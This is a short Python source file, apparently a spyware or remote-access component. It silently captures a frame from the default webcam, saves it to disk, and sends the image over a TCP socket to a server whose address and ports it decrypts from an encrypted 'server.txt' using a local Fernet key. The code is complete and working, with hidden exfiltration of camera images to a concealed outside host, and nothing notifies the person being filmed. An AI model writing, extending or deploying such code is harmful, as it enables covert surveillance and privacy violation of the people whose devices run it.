import cv2
import socket
from cryptography.fernet import Fernet

class cam_sender:

    def load_key(self):
        file = open("key.key", "rb")
        key = file.read()
        file.close()
        return key

    def decrypt_server_details(self, encrypted_details):
        key = self.load_key()
        cipher = Fernet(key)
        decrypted_details = cipher.decrypt(encrypted_details).decode()
        return decrypted_details
    
    def get_server(self):
        with open("server.txt", "rb") as server_file:
            encrypted_data = server_file.read()

            decrypted_data = self.decrypt_server_details(encrypted_data)
            for line in decrypted_data.splitlines():
                data = line.rstrip()
                self.ip, self.port, self.image_port = data.split("|")
                self.port = int(self.port) # ensure the ports are of type int
                self.image_port = int(self.image_port)

    def capture_screenshot(self):
        self.get_server()
        host = self.ip
        port = self.image_port

        capture = cv2.VideoCapture(0) # default camera
        # check if webcam opens successfully
        if not capture.isOpened():
            return # if it doesn't
        ret, frame = capture.read() # two arguments, ret is a bool to indicate if it was successful or not and frame is the captured frame
        if not ret:
            # if it wasn't successfully captured, then something went wrong
            return
        cv2.imwrite("cam.png", frame) # save the captured frame as a screenshot
        capture.release()
        cv2.destroyAllWindows()

        with open("cam.png", "rb") as image_file:
            screenshot_data = image_file.read()

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((host, port))
            client_socket.sendall(screenshot_data)

if __name__ == "__main__":
    app = cam_sender()
    app.capture_screenshot()
    